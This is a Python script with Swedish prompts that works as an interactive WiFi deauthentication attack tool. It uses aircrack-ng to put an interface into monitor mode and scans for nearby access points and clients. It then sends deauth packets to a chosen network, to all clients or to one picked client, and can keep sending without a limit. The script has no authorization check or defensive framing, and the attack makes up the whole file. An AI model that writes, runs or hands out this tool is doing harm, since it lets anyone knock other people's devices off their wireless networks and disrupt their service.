import os
import sys
import shutil
import subprocess
import tempfile
import time


TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "iw"]


def get_wireless_interfaces():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    ifaces = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            ifaces.append(line.split()[1])
    return ifaces


def start_monitor(iface):
    print(f"[INFO] Sätter {iface} i monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", iface],
                   capture_output=True, text=True)
    mon_iface = iface + "mon"
    # Verify the monitor interface was created
    active = get_wireless_interfaces()
    if mon_iface not in active:
        # Some drivers rename differently; try to find a new monitor interface
        before = set([iface])
        for candidate in active:
            if candidate not in before:
                mon_iface = candidate
                break
        else:
            raise RuntimeError(f"[!] Kunde inte hitta monitor-interface efter airmon-ng start.")
    print(f"[INFO] Monitor interface: {mon_iface}")
    return mon_iface


def stop_monitor(mon_iface):
    print(f"\n[INFO] Återställer {mon_iface} till managed mode...")
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface],
                   capture_output=True, text=True)


def parse_airodump_csv(csvfile):
    aps = []
    clients = []

    try:
        with open(csvfile, encoding="utf-8", errors="replace") as f:
            content = f.read()
    except FileNotFoundError:
        return aps, clients

    # Split into AP section and client section at the blank line between them
    sections = content.split("\n\n")
    if not sections:
        return aps, clients

    # --- Parse APs ---
    ap_lines = sections[0].splitlines()
    for line in ap_lines[1:]:  # skip header row
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0].strip()
        if not bssid or len(bssid) != 17:
            continue
        channel = parts[3].strip()
        enc = parts[5].strip()
        power = parts[8].strip()
        essid = parts[13].strip()
        aps.append({
            "bssid": bssid,
            "channel": channel,
            "enc": enc,
            "power": power,
            "essid": essid if essid else "<hidden>",
        })

    # --- Parse clients ---
    if len(sections) > 1:
        client_lines = sections[1].splitlines()
        for line in client_lines[1:]:  # skip header row
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 6:
                continue
            mac = parts[0].strip()
            if not mac or len(mac) != 17:
                continue
            ap_bssid = parts[5].strip()
            clients.append({"mac": mac, "bssid": ap_bssid})

    return aps, clients


def scan_networks(mon_iface, duration):
    print(f"\n[INFO] Skannar efter nätverk i {duration} sekunder...\n")

    with tempfile.TemporaryDirectory() as tmpdir:
        outfile = os.path.join(tmpdir, "scan")
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", outfile, "--output-format", "csv", mon_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        try:
            for remaining in range(duration, 0, -1):
                sys.stdout.write(f"\r  Skannar... {remaining:2d}s kvar  ")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            proc.terminate()
            proc.wait()

        print("\r  Skanning klar.             ")

        csvfile = outfile + "-01.csv"
        return parse_airodump_csv(csvfile)


def run():
    print("\n=== WiFi Monitor / Deauth ===")

    if os.geteuid() != 0:
        print("[!] Kräver root-privilegier. Kör med sudo.")
        return

    for tool in TOOLS:
        if shutil.which(tool) is None:
            print(f"[!] {tool} hittades inte. Installera aircrack-ng: sudo apt install aircrack-ng")
            return

    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("[!] Inga trådlösa interface hittades.")
        return

    print("\nVälj trådlöst interface:")
    for i, iface in enumerate(ifaces, 1):
        print(f"[{i}] {iface}")

    try:
        sel = int(input("\nVal: "))
        if not (1 <= sel <= len(ifaces)):
            raise ValueError("out of range")
        iface = ifaces[sel - 1]
    except Exception:
        print("[!] Ogiltigt val.")
        return

    while True:
        try:
            duration = int(input("Hur länge ska vi skanna? (sekunder): "))
            if duration <= 0:
                raise ValueError("must be positive")
            break
        except ValueError:
            print("[!] Ange ett positivt heltal.")

    mon_iface = None
    try:
        mon_iface = start_monitor(iface)

        aps, clients = scan_networks(mon_iface, duration)

        if not aps:
            print("[!] Inga nätverk hittades.")
            return

        print(f"\n{'#':<4} {'BSSID':<19} {'CH':>3}  {'PWR':>4}  {'ENC':<8} ESSID")
        print("-" * 60)
        for i, ap in enumerate(aps, 1):
            print(f"{i:<4} {ap['bssid']:<19} {ap['channel']:>3}  {ap['power']:>4}  {ap['enc']:<8} {ap['essid']}")

        print("\nVälj nätverk för deauth (0 = avbryt):")
        try:
            sel = int(input("Val: "))
            if sel == 0:
                return
            if not (1 <= sel <= len(aps)):
                raise ValueError("out of range")
            target_ap = aps[sel - 1]
        except Exception:
            print("[!] Ogiltigt val.")
            return

        print(f"\n[+] Valt nätverk: {target_ap['essid']} ({target_ap['bssid']})")

        # --- Deauth target selection ---
        print("\n[1] Broadcast (alla klienter)")
        print("[2] Välj specifik klient")
        try:
            mode = int(input("Val: "))
            if mode not in (1, 2):
                raise ValueError()
        except Exception:
            print("[!] Ogiltigt val.")
            return

        client_mac = None
        if mode == 2:
            ap_clients = [c for c in clients if c["bssid"] == target_ap["bssid"]]
            if not ap_clients:
                print("[!] Inga klienter hittades för detta nätverk under skanningen.")
                print("[INFO] Prova en längre skanningstid eller välj broadcast istället.")
                return
            print("\nKlienter:")
            for i, c in enumerate(ap_clients, 1):
                print(f"[{i}] {c['mac']}")
            try:
                csel = int(input("Val: "))
                if not (1 <= csel <= len(ap_clients)):
                    raise ValueError("out of range")
                client_mac = ap_clients[csel - 1]["mac"]
            except Exception:
                print("[!] Ogiltigt val.")
                return

        # --- Deauth count ---
        while True:
            try:
                count = int(input("\nAntal deauth-paket (0 = kontinuerlig tills Ctrl+C): "))
                if count < 0:
                    raise ValueError("negative")
                break
            except ValueError:
                print("[!] Ange ett heltal >= 0.")

        cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", target_ap["bssid"]]
        if client_mac:
            cmd += ["-c", client_mac]
        cmd.append(mon_iface)

        target_desc = client_mac if client_mac else "alla klienter"
        print(f"\n[INFO] Skickar deauth mot {target_ap['essid']} ({target_desc})...")
        if count == 0:
            print("[INFO] Tryck Ctrl+C för att stoppa.\n")

        try:
            if count == 0:
                proc = subprocess.Popen(cmd)
                proc.wait()
            else:
                subprocess.run(cmd)
        except KeyboardInterrupt:
            if count == 0:
                proc.terminate()
            print("\n[!] Deauth avbruten.")

        print("\n[+] Klar.")

    except RuntimeError as e:
        print(e)
    finally:
        if mon_iface:
            stop_monitor(mon_iface)
